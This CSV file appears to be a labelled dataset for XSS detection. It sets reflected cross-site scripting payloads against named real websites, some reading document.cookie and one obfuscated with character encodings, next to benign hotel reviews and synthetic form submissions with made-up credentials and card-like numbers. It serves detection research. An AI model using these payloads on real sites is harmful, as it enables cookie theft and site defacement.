Payloads,Class,decoded,executed,parser_changed
http://www.rarlab.com/gp_continent.php?continent=%3cscript%3ealert('the_miller')%3c/script%3e,Malicious,http://www.rarlab.com/gp_continent.php?continent=<script>alert('the_miller')</script>,True,True
http://www.opensecrets.org/indivs/donor_lookup.php?name=%3cscript%3ealert(document.cookie);%3c/scrip<br>t%3e,Malicious,http://www.opensecrets.org/indivs/donor_lookup.php?name=<script>alert(document.cookie);</script>,True,True
http://www.avcilarortopedi.com/main/search_results.asp?words=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.avcilarortopedi.com/main/search_results.asp?words=""><script>alert(""backdoor"")</script>",True,True
"great place, great price we stayed at the beverly garland hotel last july, we wanted a place that was near the universal studios park, we stayed for a couple of nights and we were pleasently surprised. the ambiance was very california with nice touches, the place well mantained, pool, gardens, tennis court, etc. the room was clean and spacious, and the restaurant on site was really good . ( we had a great dinner for less money than for the greasy pizza we had at the theme park). we would stay here again with out a doubt. and they even have a free shuttle to the park, very convenient.",Benign,"great place, great price we stayed at the beverly garland hotel last july, we wanted a place that was near the universal studios park, we stayed for a couple of nights and we were pleasently surprised. the ambiance was very california with nice touches, the place well mantained, pool, gardens, tennis court, etc. the room was clean and spacious, and the restaurant on site was really good . ( we had a great dinner for less money than for the greasy pizza we had at the theme park). we would stay here again with out a doubt. and they even have a free shuttle to the park, very convenient.",False,False
http://www.mattwoodward.com/blog/index.cfm?event=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.mattwoodward.com/blog/index.cfm?event=""><script>alert(""maxwel"")</script>",True,True
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5770&b1=confirmar,Benign,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5770&b1=confirmar,False,False
http://indoscripts.co.cc/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious,http://indoscripts.co.cc/signinform.php?msg=<script>alert(/xssed/)</script>,True,True
"great time we had a fine experience at hotel royal over new year's eve weekend. super trendy and cool interior design and a great private balcony over st. phillip street easily make up for the smallness of the room that we stayed in for 3 nights.they have a charming courtyard, excellent location, and my girlfriend had a very romantic time at this hotel. plus, there's a great breakfast spot (sun cafe) right under the hotel.",Benign,"great time we had a fine experience at hotel royal over new year's eve weekend. super trendy and cool interior design and a great private balcony over st. phillip street easily make up for the smallness of the room that we stayed in for 3 nights.they have a charming courtyard, excellent location, and my girlfriend had a very romantic time at this hotel. plus, there's a great breakfast spot (sun cafe) right under the hotel.",False,False
registro&login=zalzale1&password=vi%d1eta&nombre=neil&apellidos=jandette+tarrida&email=castiglioni%40hiperbilbao.nl&dni=24806506v&direccion=calle+rioguadalimar+183+1%3fe&ciudad=torms%2c+els&cp=40542&provincia=c%e1diz&ntc=4542202458392809&b1=registrar,Benign,"registro&login=zalzale1&password=vi�eta&nombre=neil&apellidos=jandette tarrida&email=castiglioni@hiperbilbao.nl&dni=24806506v&direccion=calle rioguadalimar 183 1?e&ciudad=torms, els&cp=40542&provincia=c�diz&ntc=4542202458392809&b1=registrar",False,False
registro&login=croiseti&password=e0l4i1&nombre=bohdan&apellidos=carrera&email=muenpasitiwet%40magritte.gov&dni=11938734d&direccion=c%2f+hermanos+pinzon+178+&ciudad=andosilla&cp=28590&provincia=lleida&ntc=6298939668445611&b1=registrar,Benign,registro&login=croiseti&password=e0l4i1&nombre=bohdan&apellidos=carrera&email=muenpasitiwet@magritte.gov&dni=11938734d&direccion=c/ hermanos pinzon 178 &ciudad=andosilla&cp=28590&provincia=lleida&ntc=6298939668445611&b1=registrar,False,False
"resubmit=1&cnno=""><script>alert(0)</script><""",Malicious,"resubmit=1&cnno=""><script>alert(0)</script><""",True,True
http://www.wikihow.com/be-ghetto-fabulous-on-facebook&t=1396629713922&n=5430857&k=mainentity,Benign,http://www.wikihow.com/be-ghetto-fabulous-on-facebook&t=1396629713922&n=5430857&k=mainentity,False,False
http://www.mmaweekly.com/absolutenm/ppl.search.asp?search='&quot;&gt;&lt;script&gt;alert('xss');&lt;/script&gt;,Malicious,"http://www.mmaweekly.com/absolutenm/ppl.search.asp?search='""><script>alert('xss');</script>",True,True
"take along written confirmation! just got back from three nights at the affinia dumont. booked the roomearly january, requested a room with two beds and a sleeper sofa as therewere three women traveling together. i emailed the hotel before i booked the room to verify that we could reserve this particular bed arrangement. i made the final booking thru small and elegant hotels and had them note that we were guarenteed two beds. called to confirm everything a week before we arrived.at check in the receptionist tells me that they have only rooms available with one king bed but they could bring us a roll away bed. i kept telling her that it was not acceptable. i said that my friend and i did were not going to sleep in the same bed. she kept repeating that there was nothing she could do. she reviewed my written confirmation (so glad i took it!) but kept insisting that she could not accoma",Benign,"take along written confirmation! just got back from three nights at the affinia dumont. booked the roomearly january, requested a room with two beds and a sleeper sofa as therewere three women traveling together. i emailed the hotel before i booked the room to verify that we could reserve this particular bed arrangement. i made the final booking thru small and elegant hotels and had them note that we were guarenteed two beds. called to confirm everything a week before we arrived.at check in the receptionist tells me that they have only rooms available with one king bed but they could bring us a roll away bed. i kept telling her that it was not acceptable. i said that my friend and i did were not going to sleep in the same bed. she kept repeating that there was nothing she could do. she reviewed my written confirmation (so glad i took it!) but kept insisting that she could not accoma",False,False
"<a href=""javascript&colon;\u0061&#x6c;&#101%72t&lpar;1&rpar;""><button>",Malicious,"<a href=""javascript:\u0061lert(1)""><button>",True,True
http://www.spires.lipi.go.id/spires/find/hep/www?rawcmd=&quot;&gt;&lt;script&gt;alert(&quot;cyber-warrior.org&quot;)&lt;/script<br>&gt;,Malicious,"http://www.spires.lipi.go.id/spires/find/hep/www?rawcmd=""><script>alert(""cyber-warrior.org"")</script>",True,True
"great hotel los angeles is vast, and as such it is very difficult to locate a é¥?¦entreé¥? i decided to stay for 3 nights at the hilton, and 2 nights at santa monica. the hilton itself is quite a way from lax ($80 in a cab), but located steps from universal studios.the pool is very nice, clean and quiet and gets the sun all day. thehotel is big and relatively busy, with lost of staff to help out.room was big, with a large bathroom. if i am being really picky, theelevators took an age to arrive each time you called them!i chose the hilton because having visited la before i knew how close it was to the city walk é¥?a free, é¥?¦©edestrian- friendlyé¥?street full of shops, arcades, restaurants and a couple of bars. very crowded at weekends, but pleasant during the week it a perfect place to go with or with-out kids. the bars charge a cover (about $10) even when it is quiet, which is annoying. but i had a good night at bb kings blues club in the centreof the city walk. there is also a imax and the usual chain restaurants (hard rock cafè tony romaé¥???).",Benign,"great hotel los angeles is vast, and as such it is very difficult to locate a é¥?¦entreé¥? i decided to stay for 3 nights at the hilton, and 2 nights at santa monica. the hilton itself is quite a way from lax ($80 in a cab), but located steps from universal studios.the pool is very nice, clean and quiet and gets the sun all day. thehotel is big and relatively busy, with lost of staff to help out.room was big, with a large bathroom. if i am being really picky, theelevators took an age to arrive each time you called them!i chose the hilton because having visited la before i knew how close it was to the city walk é¥?a free, é¥?¦©edestrian- friendlyé¥?street full of shops, arcades, restaurants and a couple of bars. very crowded at weekends, but pleasant during the week it a perfect place to go with or with-out kids. the bars charge a cover (about $10) even when it is quiet, which is annoying. but i had a good night at bb kings blues club in the centreof the city walk. there is also a imax and the usual chain restaurants (hard rock cafè tony romaé¥???).",False,False
http://www.irep.ecologie.gouv.fr/irep/quickresult.php?saveget=1&amp;strrecherche=/&quot;&gt;&lt;script&gt;alert(1)&lt;/sc<br>ript&gt;,Malicious,"http://www.irep.ecologie.gouv.fr/irep/quickresult.php?saveget=1&strrecherche=/""><script>alert(1)</script>",True,True
http://www.omwave.com/v2/omwave/index.php?id=2&amp;hid=5&amp;lang=fr}%3c/style%3e%3cscript%3ea=eval;b=alert;<br>a(b(/xss/.source));%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.omwave.com/v2/omwave/index.php?id=2&hid=5&lang=fr}</style><script>a=eval;b=alert;a(b(/xss/.source));</script><marquee bgcolor=""red""><h1>xss</h1></marquee>",True,True
http://www2.dgeep.mtss.gov.pt/docbweb/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxtrm=20&amp;t<br>rmcols=2&amp;form=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www2.dgeep.mtss.gov.pt/docbweb/indexres.asp?base=isbd&prefix=&indexkey==376-8716.&maxtrm=20&trmcols=2&form=comp&recpag=5&navdirection=0&addtermo=""><script>alert(document.cookie)</script>",True,True
http://audio.kavkazcenter.com/index.php?cat=3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b%3<br>c/script%3e,Malicious,"http://audio.kavkazcenter.com/index.php?cat=3e""><script 
>alert(document.cookie);</script>",True,True
http://www.litteraturnettet.no/d/dagrin.bengt.g.asp?lang=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.litteraturnettet.no/d/dagrin.bengt.g.asp?lang=""><script>alert(""maxwel"")</script>",True,True
registro&login=leafloor&password=consist%2bente&nombre=agust%edn&apellidos=vilca+llora&email=gonzale.katsuno%40viajesparamujeres.tc&dni=38847166m&direccion=copons%2c+11+&ciudad=abades&cp=01806&provincia=soria&ntc=7892581903274474&b1=registrar,Benign,"registro&login=leafloor&password=consist ente&nombre=agust�n&apellidos=vilca llora&email=gonzale.katsuno@viajesparamujeres.tc&dni=38847166m&direccion=copons, 11 &ciudad=abades&cp=01806&provincia=soria&ntc=7892581903274474&b1=registrar",False,False
